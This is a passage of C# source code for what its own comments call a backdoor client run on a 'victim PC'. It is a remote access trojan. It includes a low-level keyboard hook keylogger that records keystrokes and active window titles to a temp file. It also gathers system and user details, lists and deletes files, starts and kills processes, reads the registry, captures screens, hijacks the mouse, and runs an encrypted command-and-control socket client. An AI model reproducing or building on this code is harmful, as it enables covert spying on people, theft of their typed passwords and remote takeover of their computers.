                RCONTROL = 29,
                LMENU = 56,
                RMENU = 56,
                BROWSER_BACK = 106,
                BROWSER_FORWARD = 105,
                BROWSER_REFRESH = 103,
                BROWSER_STOP = 104,
                BROWSER_SEARCH = 101,
                BROWSER_FAVORITES = 102,
                BROWSER_HOME = 50,
                VOLUME_MUTE = 32,
                VOLUME_DOWN = 46,
                VOLUME_UP = 48,
                MEDIA_NEXT_TRACK = 25,
                MEDIA_PREV_TRACK = 16,
                MEDIA_STOP = 36,
                MEDIA_PLAY_PAUSE = 34,
                LAUNCH_MAIL = 108,
                LAUNCH_MEDIA_SELECT = 109,
                LAUNCH_APP1 = 107,
                LAUNCH_APP2 = 33,
                OEM_1 = 39,
                OEM_PLUS = 13,
                OEM_COMMA = 51,
                OEM_MINUS = 12,
                OEM_PERIOD = 52,
                OEM_2 = 53,
                OEM_3 = 41,
                OEM_4 = 26,
                OEM_5 = 43,
                OEM_6 = 27,
                OEM_7 = 40,
                OEM_8 = 0,
                OEM_102 = 86,
                PROCESSKEY = 0,
                PACKET = 0,
                ATTN = 0,
                CRSEL = 0,
                EXSEL = 0,
                EREOF = 93,
                PLAY = 0,
                ZOOM = 98,
                NONAME = 0,
                PA1 = 0,
                OEM_CLEAR = 0,
            }

            /// <summary>
            /// Define HARDWAREINPUT struct
            /// </summary>
            [StructLayout(LayoutKind.Sequential)]
            internal struct HARDWAREINPUT
            {
                internal int uMsg;
                internal short wParamL;
                internal short wParamH;
            }
        }
        internal class KeyLogger
        {
            //SAVE FILE
            public string file_keylogger = Path.Combine(new string[] { Path.GetTempPath(), "keylogger.rtf" });

            //STREAM WRITER
            private StreamWriter file_sw;

            //NON PRINTABLE KEY
            private readonly Dictionary<int, string> dic_NonPrintableKeys = new Dictionary<int, string>()
            {
                { 0x08, "[Backspace]" },
                { 0x09, "[Tab]" },
                { 0x0D, "[Enter]" },
                { 0x10, "[Shift]" },
                { 0x11, "[Ctrl]" },
                { 0x12, "[Alt]" },
                { 0x13, "[Pause]" },
                { 0x1B, "[Escape]" },
                { 0x20, "[Spacebar]" },
                { 0x21, "[PageUp]" },
                { 0x22, "[PageDown]" },
                { 0x23, "[End]" },
                { 0x24, "[Home]" },
                { 0x25, "[LeftArrow]" },
                { 0x26, "[UpArrow]" },
                { 0x27, "[RightArrow]" },
                { 0x28, "[DownArrow]" },
                { 0x29, "[Insert]" },
                { 0x2A, "[Delete]" },
                { 0x2B, "[Select]" },
                { 0x2C, "[PrintScreen]" },
                { 0x2D, "[Insert]" },
                { 0x2E, "[Delete]" },
                { 0x5B, "[LWin]" },
                { 0x5C, "[RWin]" },
                { 0x5D, "[Apps]" },
                { 0x70, "[F1]" },
                { 0x71, "[F2]" },
                { 0x72, "[F3]" },
                { 0x73, "[F4]" },
                { 0x74, "[F5]" },
                { 0x75, "[F6]" },
                { 0x76, "[F7]" },
                { 0x77, "[F8]" },
                { 0x78, "[F9]" },
                { 0x79, "[F10]" },
                { 0x7A, "[F11]" },
                { 0x7B, "[F12]" },
                { 0x90, "[NumLock]" },
                { 0x91, "[ScrollLock]" },
                { 0xA0, "[LeftShift]" },
                { 0xA1, "[RightShift]" },
                { 0xA2, "[LeftCtrl]" },
                { 0xA3, "[RightCtrl]" },
                { 0xA4, "[LeftAlt]" },
                { 0xA5, "[RightAlt]" },
                { 0xA6, "[BrowserBack]" },
                { 0xA7, "[BrowserForward]" },
                { 0xA8, "[BrowserRefresh]" },
                { 0xA9, "[BrowserStop]" },
                { 0xAA, "[BrowserSearch]" },
                { 0xAB, "[BrowserFavorites]" },
                { 0xAC, "[BrowserHome]" },
                { 0xB0, "[Mute]" },
                { 0xB1, "[VolumeDown]" },
                { 0xB2, "[VolumeUp]" },
                { 0xB3, "[NextTrack]" },
                { 0xB4, "[PreviousTrack]" },
                { 0xB5, "[StopMedia]" },
                { 0xB6, "[PlayPauseMedia]" },
                { 0xB7, "[LaunchMail]" },
                { 0xB8, "[SelectMedia]" },
                { 0xB9, "[LaunchApplication1]" },
                { 0xBA, "[Semicolon]" },
                { 0xBB, "[Plus]" },
                { 0xBC, "[Comma]" },
                { 0xBD, "[Minus]" },
                { 0xBE, "[Period]" },
                { 0xBF, "[Slash]" },
                { 0xC0, "[GraveAccent]" }
            };

            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern int ToAscii(uint uVirtKey, uint uScanCode, byte[] lpKeyState, [Out] byte[] lpChar, uint uFlags);

            private static IntPtr _hookID = IntPtr.Zero;

            public void Start()
            {
                if (file_sw != null)
                    try { file_sw.Close(); } catch { }

                if (!File.Exists(file_keylogger))
                    File.Create(file_keylogger).Close();

                _hookID = SetHook(HookCallback);
                Application.Run();
            }

            public void Stop()
            {
                UnhookWindowsHookEx(_hookID);
                file_sw.Close();
            }

            public string Read()
            {
                if (File.Exists(file_keylogger))
                {
                    return File.ReadAllText(file_keylogger);
                }

                return string.Empty;
            }

            private IntPtr SetHook(LowLevelKeyboardProc proc)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                {
                    using (ProcessModule curModule = curProcess.MainModule)
                    {
                        return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                    }
                }
            }

            private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;

                    // Handle specific key presses here
                    byte[] keyState = new byte[256];
                    byte[] keyOutput = new byte[2];

                    // Get the current state of the keyboard
                    string str_key = string.Empty;
                    if (ToAscii((uint)vkCode, 0, keyState, keyOutput, 0) == 1)
                    {
                        if (dic_NonPrintableKeys.Keys.Contains(vkCode))
                        {
                            str_key = dic_NonPrintableKeys[vkCode];
                        }
                        else
                        {
                            char key_char = (char)keyOutput[0];
                            str_key = key_char.ToString();
                        }
                    }
                    else
                    {
                        if (dic_NonPrintableKeys.Keys.Contains(vkCode))
                        {
                            str_key = dic_NonPrintableKeys[vkCode];
                        }
                        else
                        {
                            str_key = $"[{key.ToString()}]";
                        }
                    }
                    File.AppendAllText(file_keylogger, Crypto.b64E2Str($"{Crypto.b64E2Str(GetActiveWindowTitle())}|{Crypto.b64E2Str(DateTime.Now.ToString("F"))}|{Crypto.b64E2Str(str_key)}"));
                    File.AppendAllText(file_keylogger, Environment.NewLine);
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
        }
        internal class FuncMouse
        {
            private bool lock_mouse = false;
            private bool crazy_mouse = false;

            [StructLayout(LayoutKind.Sequential)]
            struct MOUSEINPUT
            {
                int dx;
                int dy;
                int mouseData;
                public int dwFlags;
                int time;
                IntPtr dwExtraInfo;
            }
            struct INPUT
            {
                public uint dwType;
                public MOUSEINPUT mi;
            }
            [DllImport("user32.dll", SetLastError = true)]
            static extern uint SendInput(uint cInputs, INPUT input, int size);

            public enum MouseButton
            {
                LClick = 0x2,
                RClick = 0x4,
            }

            public string Status()
            {
                return $"{(lock_mouse ? "1" : "0")}|{(crazy_mouse ? "1" : "0")}";
            }
            public Point GetPosition()
            {
                return Cursor.Position;
            }
            public void SetPosition(int x, int y)
            {
                Cursor.Position = new Point(x, y);
            }
            public void SetPosition(Point ptn)
            {
                SetPosition(ptn.X, ptn.Y);
            }
            public void Click(MouseButton btn, Point ptn)
            {

                var input = new INPUT()
                {
                    dwType = 0, //MOUSE INPUT
                    mi = new MOUSEINPUT()
                    {
                        dwFlags = (int)btn,
                    }
                };

                if (SendInput(1, input, Marshal.SizeOf(input)) == 0)
                {
                    //EXCEPTION
                }
            }
            public void Click(MouseButton btn, int x, int y)
            {
                Click(btn, new Point(x, y));
            }
            public void Lock()
            {
                new Thread(() =>
                {
                    Point ptn = GetPosition();
                    lock_mouse = true;
                    while (lock_mouse)
                    {
                        SetPosition(ptn);
                        Thread.Sleep(100);
                    }
                }).Start();
            }
            public void Unlock()
            {
                lock_mouse = false;
            }
            public void Crazy()
            {
                Rectangle rect = Screen.PrimaryScreen.Bounds;
                new Thread(() =>
                {
                    crazy_mouse = true;
                    while (crazy_mouse)
                    {
                        Random rand = new Random();
                        Point ptn = new Point(rand.Next(rect.Width), rand.Next(rect.Height));
                        SetPosition(ptn);
                    }
                });
            }
            public void Calm()
            {
                crazy_mouse = false;
            }
            public void ChangeCursorIcon(string b64_img)
            {

            }
        }
        internal class FuncInfo
        {
            /// <summary>
            /// Information of victim PC
            /// </summary>
            internal class PC
            {
                public Size MainScreenSize()
                {
                    Rectangle rect = Screen.AllScreens[0].Bounds;
                    return new Size(rect.Width, rect.Height);
                }

                public void GetSysInfo()
                {
                    /*
                     * [ TODO ]:
                     * BIOS
                     * BATTERY
                     * ACCOUNT - LEAVE IT FOR DOMAIN?
                     * GROUP - LEAVE IT FOR DOMAIN?
                     * ENVIRONMENT VARIABLES
                     * COM
                     * USB HUB
                     */
                }

                public string Info()
                {
                    //USING THE PREFIX "d" TO REPRESENTS "DATA"
                    Size size_screen = MainScreenSize();
                    if (webcam == null)
                        webcam = new Webcam();

                    string d_basic = string.Join(";", new string[]
                    {
                        //CLIENT
                        Dns.GetHostName(), //HOST NAME
                        Application.StartupPath, //START UP DIR
                        Process.GetCurrentProcess().ProcessName, //THIS PROCESS FILENAME
                        Environment.MachineName,
                        Environment.UserName,
                        Environment.UserDomainName,
                        getOS(),

                        //HARDWARE
                        string.Join(",", Screen.AllScreens.Select(x => x.DeviceName).ToArray()),
                        string.Join(",", Screen.AllScreens.Select(x => x.WorkingArea).Select(x => $"{x.Width}x{x.Height}").ToArray()),
                        webcam.GetDevices(),
                    });

                    string d_sys = string.Join(",", new string[]
                    {

                    });

                    string data = string.Join("|", new string[]
                    {
                        d_basic, //BASIC INFORMATION
                        WMI_Query("SELECT * FROM Win32_QuickFixEngineering"), //HOTFIXES
                    }.Select(x => Crypto.b64E2Str(x)));

                    return data;
                }
            }

            /// <summary>
            /// Information of the backdoor client payload on victim PC
            /// </summary>
            public class Client
            {
                public void Info()
                {

                }
            }
        }
        internal class FuncFile
        {
            public string cp; //CURRENT PATH
            public DriveInfo[] drivers;
            public FuncFile()
            {
                cp = Application.StartupPath;
                drivers = DriveInfo.GetDrives();
            }
            public string BytesNormalize(long bytes_size)
            {
                if (bytes_size < 1024)
                    return $"{bytes_size} Bytes";
                else if (bytes_size < 1024 * 1024)
                    return $"{bytes_size / 1024.0:F2} KB";
                else if (bytes_size < 1024 * 1024 * 1024)
                    return $"{bytes_size / (1024.0 * 1024):F2} MB";
                else if (bytes_size < 1024L * 1024 * 1024 * 1024)
                    return $"{bytes_size / (1024.0 * 1024 * 1024):F2} GB";
                else
                    return $"{bytes_size / (1024.0 * 1024 * 1024 * 1024):F2} TB";
            }
            public string GetDrives()
            {
                string[] d = drivers.Select(x => string.Join(",", new string[]
                {
                x.Name.Replace("\\", string.Empty), //DRIVER NAME
                x.DriveType.ToString(), //DRIVER TYPE
                BytesNormalize(x.TotalSize), //TOTAL SIZE
                BytesNormalize(x.AvailableFreeSpace), //AVAILABLE SPACE
                x.VolumeLabel, //VOLUME LABEL
                })).ToArray();
                return string.Join("-", d);
            }
            public string ScanDir(string path, int dir_limit, int file_limit)
            {
                List<string[]> l_dir = new List<string[]>();
                List<string[]> l_file = new List<string[]>();

                int dir_cnt = 0;
                int file_cnt = 0;

                foreach (string dir in Directory.GetDirectories(path))
                {
                    bool is_readonly = false;
                    bool is_writable = false;

                    string tmp_file = Path.Combine(dir, "tmp_" + Guid.NewGuid() + ".txt");
                    try { File.Create(tmp_file).Close(); File.Delete(tmp_file); is_writable = true; } catch (Exception ex) { Console.WriteLine(ex.Message); }
                    try { Directory.GetFiles(dir); is_readonly = true; } catch { }

                    DirectoryInfo info = new DirectoryInfo(dir);
                    l_dir.Add(new string[]
                    {
                    dir,
                    "X",
                    (is_readonly ? "R" : string.Empty) + (is_writable ? "W" : string.Empty),
                    info.Attributes.ToString(),
                    info.CreationTime.ToString("F"),
                    info.LastWriteTime.ToString("F"),
                    info.LastAccessTime.ToString("F"),
                    });

                    if (dir_limit == -1)
                        continue;

                    dir_cnt++;
                    if (dir_cnt == dir_limit)
                        break;
                }

                foreach (string file in Directory.GetFiles(path))
                {
                    FileInfo info = new FileInfo(file);
                    FileAttributes attr = File.GetAttributes(file);
                    bool is_readonly = (attr & FileAttributes.ReadOnly) == FileAttributes.ReadOnly;

                    l_file.Add(new string[]
                    {
                    info.FullName,
                    BytesNormalize(info.Length),
                    is_readonly ? "R" : "RW",
                    info.Attributes.ToString(),
                    info.CreationTime.ToString("F"),
                    info.LastWriteTime.ToString("F"),
                    info.LastAccessTime.ToString("F"),
                    });

                    if (file_limit == -1)
                        continue;

                    file_cnt++;
                    if (file_cnt == file_limit)
                        break;
                }

                return string.Join("+", l_dir.Select(x => string.Join(";", x))) + "|" + string.Join("+", l_file.Select(x => string.Join(";", x)));
            }
            public string DeleteFile(string[] dst)
            {
                List<string> list = new List<string>();
                foreach (string file in dst)
                {
                    try { File.Delete(file); list.Add("1|" + Crypto.b64E2Str(file)); }
                    catch (Exception ex) { list.Add("0|" + Crypto.b64E2Str(ex.Message)); }
                }

                return string.Join(",", list.ToArray());
            }
            public string ReadFile(string dst)
            {
                string path = Crypto.b64D2Str(dst);
                try { return $"1|{dst}|{Crypto.b64E2Str(File.ReadAllText(path))}"; }
                catch (Exception ex) { return $"0|{dst}|{Crypto.b64E2Str(ex.Message)}"; }
            }
            public string WriteFile(string file, string text)
            {
                try { File.WriteAllText(file, text); return "1|" + Crypto.b64E2Str(file) + "|"; }
                catch (Exception ex) { return $"0|{Crypto.b64E2Str(file)}|{Crypto.b64E2Str(ex.Message)}"; }
            }
            public string PasteFile(string[] files, string dir_dst, bool mv = false)
            {
                List<string> list = new List<string>();
                foreach (string file in files)
                {
                    try
                    {
                        string file_dst = Path.Combine(dir_dst, Path.GetFileName(file));
                        File.Copy(file, file_dst);
                        if (mv)
                            File.Delete(file);
                        list.Add($"1|{Crypto.b64E2Str(file)}|{Crypto.b64E2Str(file_dst)}");
                    }
                    catch (Exception ex)
                    {
                        list.Add($"0|{Crypto.b64E2Str(file)}|{Crypto.b64E2Str(ex.Message)}");
                    }
                }

                return string.Join(",", list.ToArray());
            }
            public void Upload()
            {

            }
            public void Download()
            {

            }
        }
        internal class FuncTask
        {
            public string GetProcess()
            {
                List<string> result = new List<string>();
                foreach (Process p in Process.GetProcesses())
                {
                    string image_name = p.ProcessName;
                    string path = p.StartInfo.FileName;
                    string username = p.StartInfo.UserName;
                }

                return null;
            }
            public string Kill(string name)
            {
                try
                {
                    var procs = Process.GetProcessesByName(name);
                    foreach (Process p in procs)
                        p.Kill();
                }
                catch (Exception ex)
                {
                    return "0|" + ex.Message;
                }

                return "1";
            }
            public string Kill(int id)
            {
                try
                {
                    var proc = Process.GetProcessById(id);
                    proc.Kill();
                }
                catch (Exception ex)
                {
                    return "0|" + ex.Message;
                }

                return "1";
            }
            public string Start(string filename, string argv, string work_dir)
            {
                try
                {
                    Process p = new Process();
                    p.StartInfo = new ProcessStartInfo()
                    {
                        FileName = filename,
                        Arguments = argv,
                        UseShellExecute = true,
                        CreateNoWindow = true,
                        WorkingDirectory = work_dir,
                    };

                    new Thread(() =>
                    {
                        p.Start();
                        p.WaitForExit();
                    });

                    return "1|";
                }
                catch (Exception ex)
                {
                    return "0|" + Crypto.b64E2Str(ex.Message);
                }
            }
        }
        internal class FuncReg
        {
            private RegistryHive StringToRegistryHive(string hiveString)
            {
                // Convert the hive string to an enumeration value
                switch (hiveString.ToUpper())
                {
                    case "HKEY_CLASSES_ROOT":
                        return RegistryHive.ClassesRoot;
                    case "HKEY_CURRENT_USER":
                        return RegistryHive.CurrentUser;
                    case "HKEY_LOCAL_MACHINE":
                        return RegistryHive.LocalMachine;
                    case "HKEY_USERS":
                        return RegistryHive.Users;
                    case "HKEY_CURRENT_CONFIG":
                        return RegistryHive.CurrentConfig;
                    default:
                        return 0;
                }
            }
            private string GetValueTypeString(int type)
            {
                switch (type)
                {
                    case 1:
                        return "REG_SZ";
                    case 2:
                        return "REG_EXPAND_SZ";
                    case 3:
                        return "REG_BINARY";
                    case 4:
                        return "REG_DWORD";
                    case 7:
                        return "REG_MULTI_SZ";
                    default:
                        return "Unknown";
                }
            }
            public string GetRootKeys()
            {
                List<string> keys = new List<string>();
                foreach (var root_key in Enum.GetValues(typeof(RegistryHive)))
                {
                    try
                    {
                        RegistryKey key = RegistryKey.OpenBaseKey((RegistryHive)root_key, RegistryView.Default);
                        if (key.GetSubKeyNames().Length > 0)
                            keys.Add(key.Name);
                    }
                    catch (Exception ex)
                    {

                    }
                }

                return string.Join(",", keys.ToArray());
            }
            public string GetItems(string str_hive, string path)
            {
                List<string> l_subkeys = new List<string>();
                List<string> l_values = new List<string>();

                RegistryHive hive = StringToRegistryHive(str_hive);
                RegistryKey base_key = RegistryKey.OpenBaseKey(hive, RegistryView.Default);
                RegistryKey key = base_key.OpenSubKey(path);

                if (key != null)
                {
                    l_subkeys.AddRange(key.GetSubKeyNames());
                    foreach (string value_name in key.GetValueNames())
                    {
                        RegistryValueKind value_kind = key.GetValueKind(value_name);
                        string type = GetValueTypeString((int)value_kind);
                        string value = key.GetValue(value_name).ToString();
                        l_values.Add($"{value_name},{type},{Crypto.b64E2Str(value)}");
                    }

                }

                return string.Join(",", l_subkeys.ToArray()) + "|" + string.Join(";", l_values);
            }
            public bool Goto(string str_hive, string path)
            {
                RegistryHive hive = StringToRegistryHive(str_hive);
                RegistryKey base_key = RegistryKey.OpenBaseKey(hive, RegistryView.Default);
                RegistryKey key = base_key.OpenSubKey(path);

                return key != null;
            }
        }
        internal class FuncConn
        {
            public string GetConn()
            {
                List<string> result = new List<string>();

                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
                TcpConnectionInformation[] tcp_conns = properties.GetActiveTcpConnections();

                UdpStatistics udp_stats_ipv4 = properties.GetUdpIPv4Statistics();
                UdpStatistics udp_stats_ipv6 = properties.GetUdpIPv6Statistics();

                foreach (var tcp in tcp_conns)
                {
                    if (tcp != null)
                    {
                        string data = $"" +
                            $"{tcp.LocalEndPoint.AddressFamily.ToString()}," +
                            $"{tcp.LocalEndPoint.ToString()}," +
                            $"{tcp.RemoteEndPoint.ToString()}," +
                            $"{tcp.State.ToString()}";
                        result.Add(data);
                    }
                }

                return string.Join(";", result);
            }
        }
        internal class FuncWindow
        {
            //CAPTURE WINDOW
            [DllImport("gdi32.dll")]
            static extern bool BitBlt(IntPtr hdcDest, int nxDest, int nyDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

            [DllImport("gdi32.dll")]
            static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int nHeight);

            [DllImport("gdi32.dll")]
            static extern IntPtr CreateCompatibleDC(IntPtr hdc);

            [DllImport("gdi32.dll")]
            static extern IntPtr DeleteDC(IntPtr hdc);

            [DllImport("gdi32.dll")]
            static extern IntPtr DeleteObject(IntPtr hObject);

            [DllImport("user32.dll")]
            static extern IntPtr GetDesktopWindow();

            [DllImport("user32.dll")]
            static extern IntPtr GetWindowDC(IntPtr hWnd);

            [DllImport("user32.dll")]
            static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDc);

            [DllImport("gdi32.dll")]
            static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);

            [DllImport("user32.dll")]
            public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

            [DllImport("user32.dll")]
            public static extern bool IsIconic(IntPtr hWnd);

            [DllImport("user32.dll")]
            public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

            [DllImport("user32.dll")]
            public static extern bool SetForegroundWindow(IntPtr hWnd);

            [StructLayout(LayoutKind.Sequential)]
            public struct RECT
            {
                public int Left;
                public int Top;
                public int Right;
                public int Bottom;
            }

            const int SRCCOPY = 0x00CC0020;

            const int CAPTUREBLT = 0x40000000;

            // Constants for ShowWindow function
            private const int SW_RESTORE = 9;
            private const int SW_MINIMIZE = 6;

            //GET WINDOW ICON
            public const int GCL_HICONSM = -34;
            public const int GCL_HICON = -14;

            public const int ICON_SMALL = 0;
            public const int ICON_BIG = 1;
            public const int ICON_SMALL2 = 2;

            public const int WM_GETICON = 0x7F;

            public static IntPtr GetClassLongPtr(IntPtr hWnd, int nIndex)
            {
                if (IntPtr.Size > 4)
                    return GetClassLongPtr64(hWnd, nIndex);
                else
                    return new IntPtr(GetClassLongPtr32(hWnd, nIndex));
            }

            [DllImport("user32.dll", EntryPoint = "GetClassLong")]
            public static extern uint GetClassLongPtr32(IntPtr hWnd, int nIndex);

            [DllImport("user32.dll", EntryPoint = "GetClassLongPtr")]
            public static extern IntPtr GetClassLongPtr64(IntPtr hWnd, int nIndex);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = false)]
            static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

            //GET ALL WINDOW
            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern int GetWindowTextLength(IntPtr hWnd);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool IsWindowVisible(IntPtr hWnd);

            [DllImport("user32.dll", SetLastError = true)]
            public static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll", SetLastError = true)]
            public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

            [DllImport("kernel32.dll")]
            public static extern bool IsWow64Process(IntPtr hProcess, out bool isWow64);

            [DllImport("user32.dll")]
            public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

            public delegate bool EnumWindowsProc(IntPtr hWnd, int lParam);

            public string GetWindow()
            {
                List<string> result = new List<string>();
                EnumWindows((hWnd, lParam) =>
                {
                    int length = GetWindowTextLength(hWnd);
                    if (length > 0)
                    {
                        if (IsWindowVisible(hWnd))
                        {
                            StringBuilder sb = new StringBuilder(length + 1);
                            GetWindowText(hWnd, sb, sb.Capacity);
                            string window_title = sb.ToString();

                            uint process_id;
                            GetWindowThreadProcessId(hWnd, out process_id);

                            try
                            {
                                Process process = Process.GetProcessById((int)process_id);

                                bool is_Wow64;
                                IsWow64Process(process.Handle, out is_Wow64);
                                string exe_path = WMI_QueryNoEncode($"select ExecutablePath from win32_process where ProcessId = {process_id}")[0];
                                result.Add($"" +
                                    $"{Crypto.b64E2Str(window_title)}," + //WINDOW TITLE
                                    $"{Path.GetFileName(exe_path)}," + //PROCESS FILE NAME
                                    $"{process_id}," + //PROCESS ID
                                    $"{process.Handle}," + //PROCESS HANDLE
                                    $"{Crypto.b64E2Str(exe_path)}," + //PROCESS EXECUTABLE PATH
                                    $"{ExtractIcon(exe_path)}" //ICON GetAppIcon(process.Handle)
                                    );
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                        }
                    }
                    return true;
                }, IntPtr.Zero);

                return string.Join(";", result.ToArray());
            }

            public string ExtractIcon(string path)
            {
                using (Icon icon = Icon.ExtractAssociatedIcon(path))
                {
                    return BitmapToBase64(icon.ToBitmap());
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct Rect
            {
                public int Left;
                public int Top;
                public int Right;
                public int Bottom;
            }

            [DllImport("user32.dll")]
            private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

            public static Image CaptureDesktop()
            {
                return CaptureWindow(GetDesktopWindow());
            }

            public static Bitmap CaptureActiveWindow()
            {
                return CaptureWindow(GetForegroundWindow());
            }

            public static Bitmap CaptureWindow(IntPtr handle)
            {
                var rect = new Rect();
                GetWindowRect(handle, ref rect);
                var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
                var result = new Bitmap(bounds.Width, bounds.Height);

                using (var graphics = Graphics.FromImage(result))
                {
                    graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                }

                return result;
            }

            [DllImport("user32.dll")]
            private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);


            public string Capture(IntPtr handle)
            {
                return null;
            }
        }
        internal class MicroPhone
        {
            public FilterInfoCollection devices;

            public MicroPhone()
            {
                devices = new FilterInfoCollection(FilterCategory.AudioInputDevice);
                if (devices.Count == 0)
                {
                    Console.WriteLine("No audio devices found.");
                }
            }

            public void StartRecord()
            {
                var device_name = devices[0].MonikerString;
                
            }

            public void SendRecord()
            {

            }
        }

        //--------------[ CLIENT FUNCTION | END ]--------------\\

        //--------------[ CONFIGURATION | START ]--------------\\

        static string ip = "127.0.0.1";
        static int port = 5000;

        //--------------[ CONFIGURATION | END ]--------------\\

        static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static bool is_connected = false;

        //--------------[ START OF WINDOWS API ]--------------\\
        //ACTIVE WINDOW TITLE
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hwnd, StringBuilder text, int count);

        //--------------[ END OF WINDOWS API ]--------------\\

        //FUN STUFF
        static bool msg_inf = false;

        //CMD PIPELINE
        static Process cmd_proc;
        static StreamWriter cmdSw_in;

        //REMOTE DESKTOP
        static bool send_screenshot = false;
        static bool send_stopped = true;

        //MANAGER
        static FuncInfo.PC funcInfoPC;
        static FuncInfo.Client funcInfoClient;
        static FuncFile funcFile;
        static FuncTask funcTask;
        static FuncReg funcReg;
        static FuncConn funcConn;
        static FuncWindow funcWindow;
        static KeyLogger keylogger;
        static FuncMouse funcMouse;

        //WEBCAM
        static Webcam webcam;

        static byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }

        static void Received(Victim v)
        {
            try
            {
                Socket socket = v.socket;
                DSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };
                v.Send(1, 0, "Hello");
                do
                {
                    static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                    recv_len = v.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < DSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = DSP.GetHeader(dynamic_recvBuf);
                        while (dynamic_recvBuf.Length - DSP.HEADER_SIZE >= head_info.len)
                        {
                            dsp = new DSP(dynamic_recvBuf);
                            dynamic_recvBuf = dsp.MoreData;
                            head_info = DSP.GetHeader(dynamic_recvBuf);
                            if (dsp.Command == 0) //DISCONNECT
                            {
                                if (dsp.Param == 0)
                                {

                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string rsa_publicKey = Crypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                    rsa_publicKey = Crypto.b64D2Str(rsa_publicKey);
                                    v.key_pairs.public_key = rsa_publicKey;
                                    var aes = Crypto.AES_GenerateKeyAndIV();
                                    v._AES.key = Convert.FromBase64String(aes.key);
                                    v._AES.iv = Convert.FromBase64String(aes.iv);
                                    string payload = aes.key + "|" + aes.iv;
                                    byte[] enc_payload = Crypto.RSAEncrypt(payload, rsa_publicKey);
                                    v.Send(1, 1, enc_payload);
                                }
                                else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                {
                                    byte[] buffer = dsp.GetMsg().msg;
                                    string payload = Encoding.UTF8.GetString(buffer);
                                    buffer = Convert.FromBase64String(payload);
                                    payload = Crypto.AESDecrypt(buffer, v._AES.key, v._AES.iv);
                                    payload = Convert.ToBase64String(Crypto.RSAEncrypt(payload, v.key_pairs.public_key));
                                    payload = Crypto.AESEncrypt(payload, v._AES.key, v._AES.iv);
                                    v.Send(1, 3, payload);
                                }
                                else if (dsp.Param == 4)
                                {
                                    new Thread(() => SendInfo(v)).Start();
                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0) //RECEIVED COMMAND
                                {
                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                    payload = Crypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
